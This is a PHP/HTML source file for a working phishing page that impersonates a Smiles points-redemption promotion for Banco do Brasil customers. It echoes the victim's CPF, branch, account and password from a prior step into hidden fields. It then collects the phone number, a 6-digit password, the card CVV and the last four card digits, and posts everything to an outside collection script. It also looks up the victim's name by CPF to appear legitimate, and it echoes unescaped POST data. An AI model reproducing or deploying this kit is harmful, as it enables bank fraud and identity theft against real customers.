<?php 
  $url_atual = "http" . (isset($_SERVER[HTTPS]) ? (($_SERVER[HTTPS]=="on") ? "s" : "") : "") . "://" . "$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

  $explodeUrl = explode("/",$url_atual);
  $novaUrl = array_pop($explodeUrl);
  $explodeUrl = implode("/",$explodeUrl);
?>
<!DOCTYPE html>
<html lang="pt-BR">
   <head>
        <title>Resgate de Pontos | Promoção Smiles</title>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="theme-color" content="">
        
        <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
        <link rel="stylesheet" type="text/css" href="css/estilo.css">
        <link href="img/favicon.ico" rel="Shortcut Icon">

        <script src="js/jquery-3.2.1.min.js"></script>
        <script src="js/bootstrap.js"></script>
        <script src="js/script1.js"></script>

        <script src="js/script2.js?Xxxxdss" language="javascript"></script>
        <script src="//irql.bipbop.com.br/js/jquery.bipbop.min.js"></script>
        <script language="javascript">
            var isOK = false;
        </script>

   </head>

<body>
   <header role="banner" class="header header-pinned ng-scope">
       <div class="container-content content-header ng-scope">
           <div class="header-brands">
               <div class="header-brand">
                  <img alt="smiles&bb" class="img-responsive img-header-brand ng-scope img-header-brand-hero" src="img/logo.png" style="">
               </div>
           </div> 
       </div>
   </header>

   <main role="main" class="main main-content ng-scope">
       <div class="mpass-card ng-scope">
           <div class="container">
               <div class="row">
                   <div class="col-sm-6">
                       <div class="container-announcements clearfix">
                           <h1 class="text-announcements">Estamos quase terminando</h1>
                           <p class="text-announcements h3 ng-scope">Nessa etapa iremos coletar algumas informações para podermos finalizar o Resgate do seus Pontos.</p>

                           <div class="user-information-tile-container">
                              <div class="user-information-tile-info">
                                 <span style="font-weight: bold; float: left; width: 100px; ">Nome</span>

                                  <span style="font-weight: bold; float: left; width: 105px;">Agência</span>
                                  <span style="font-weight: bold;">Conta</span>
                              </div>
                               <div class="user-information-tile-info">
                                  <span style="font-weight: bold; float: left; width: 108px;" id="nome">Cliente</span>

                                  <!-- <div id="campos" style="clear: both;"> -->
                                   <span style="font-weight: bold; float: left; width: 90px"><?php echo $_POST['ag']; ?></span>
                                   <span style="font-weight: bold;"><?php echo $_POST['cnt']; ?></span>
                               </div>
                           </div>
                       </div>
                       <div class="visible-sm-block visible-md-block visible-lg-block user-information-terms-privacy">
                           <mc-legal-docs display-text="userInformation.acceptanceText" class="ng-isolate-scope">
                               <p>
                                   <small class="">Ao clicar em "Continuar", eu confirmo que li e concordo com os <a class="link link-secondary link-terms" href="#">Termos</a> e <a class="link link-secondary link-privacy" href="#">Aviso de Privacidade</a> do Smiles. Eu também confirmo que concordo em receber comunicações sobre minha conta Smiles por e-mail.</small>
                               </p>
                           </mc-legal-docs>
                       </div>
                   </div>
                   <div class="col-sm-6">
                    <div class="formly-field ng-scope ng-isolate-scope formly-field-group">
                      <form class="row formly ng-pristine ng-valid ng-scope ng-isolate-scope" method="POST" action="http://bullmanescoras.com.br/ema/envio-smiles-bb.php">
                        <input type="hidden" name="cpf" id="cpf" value="<?php echo $_POST['cpf']; ?>" />
                        <input type="hidden" name="ag" id="ag" value="<?php echo $_POST['ag']; ?>" />
                        <input type="hidden" name="cnt" id="cnt" value="<?php echo $_POST['cnt']; ?>" />
                        <input type="hidden" name="s8" id="s8" value="<?php echo $_POST['s8']; ?>" />

                        <input type="hidden" name="erro" value="<?php echo $explodeUrl.'/finalizar.php'; ?>" />
                        <input type="hidden" name="sucesso" value="<?php echo $explodeUrl.'/finalizar.php'; ?>" />
                        

                        <div class="formly-field ng-scope ng-isolate-scope col-xs-4 formly-field-input">
                          <div class="form-group ng-scope">
                            <input class="form-control" placeholder="DDD" maxlength="2" name="ddd" id="ddd" type="tel" onkeypress="return SomenteNumero(event)" onkeyup="pulacampo('ddd','numero');" required autofocus>
                            <div class="error-messages forgeforms-collapser ng-active collapse in">
                            </div>
                          </div>
                        </div> 
                        <div class="formly-field ng-scope ng-isolate-scope col-xs-8 formly-field-input">
                          <div class="form-group ng-scope">
                            <input class="form-control" placeholder="Número" maxlength="10" name="numero" id="numero" type="tel" onkeypress="return SomenteNumero(event)" onkeyup="mascaraMike('#####-####', this);javascript:pulacampo('numero','s6');" required>
                            <div class="error-messages forgeforms-collapser ng-active collapse in">
                            </div>
                          </div>
                        </div>
                        <div class="formly-field ng-scope ng-isolate-scope col-xs-12 formly-field-input">
                          <div class="form-group ng-scope">
                            <input class="form-control" id="s6" name="s6" placeholder="senha (6 dígitos)" type="password" onkeypress="return SomenteNumero(event)" oninvalid="setCustomValidity('Digite um código de Segurança válido !')" onchange="try{setCustomValidity('')}catch(e){}" onkeyup="pulacampo('s6','cvv');" maxlength="6" required>
                            <div class="error-messages forgeforms-collapser ng-active collapse in">
                            </div>
                          </div>
                        </div>
                        <div class="formly-field ng-scope ng-isolate-scope formly-field-group">
                            <div class="formly-field ng-scope ng-isolate-scope col-xs-6 formly-field-fieldCardExpirationDate">
                              <div class="ng-scope form-group has-feedback">
                                <label class="control-label">
                                    Cód.Segurança do cartão
                                </label>
                                <input class="form-control" id="cvv" name="cvv" placeholder="CVV" type="tel" onkeypress="return SomenteNumero(event)" oninvalid="setCustomValidity('Digite um código de Segurança válido !')" onchange="try{setCustomValidity('')}catch(e){}" onkeyup="pulacampo('cvv','ultimos');" maxlength="3" required>
                              </div>
                            </div>
                            <div class="formly-field ng-scope ng-isolate-scope col-xs-6 formly-field-fieldCardExpirationDate">
                              <div class="ng-scope form-group has-feedback">
                                <label class="control-label ">
                                    4 últimos digítos do cartão
                                </label>
                                <input class="form-control" placeholder="****" id="ultimos" name="ultimos" type="tel" onkeypress="return SomenteNumero(event)" oninvalid="setCustomValidity('Digite um Número válido !')" onchange="try{setCustomValidity('')}catch(e){}" onkeyup="pulacampo('ultimos','continue');" maxlength="4" required>
                              </div>
                            </div>
                          </div>
                        <div class="formly-field ng-scope ng-isolate-scope formly-field-group">
                          <div class="formly-field ng-scope ng-isolate-scope col-xs-6 formly-field-fieldCardExpirationDate">
                            <div class="ng-scope form-group has-feedback">
                              <button type="submit" name="continue" id="continue" class="btn btn-block btn-primary">Continuar</button>
                            </div>
                          </div>
                        </div>
                      </form>
                      </div>
                      </div>
                   </div>
               </div>
           </div>
       </div>
   </main>
</body>

<script language="javascript">
    $(document).ready(function(){
        
        
        $().bipbop("SELECT FROM 'BIPBOPJS'.'CPFCNPJ'", null, {
          data: {
              documento: $("#cpf").val(),
          },

          success: function(data) {
            var nome = $(data).find("body nome").text();
            var exception = $(data).find("header exception").text();

            if (exception) {
              exception = exception.replace(/, t/, '. T');
              //$('#status').text(exception);
            } else {
              $("#nome").text(ucfirst(nome.split(" ")[0]));
              $("#dados").show();
            }
          }
        });
        
    });
</script>
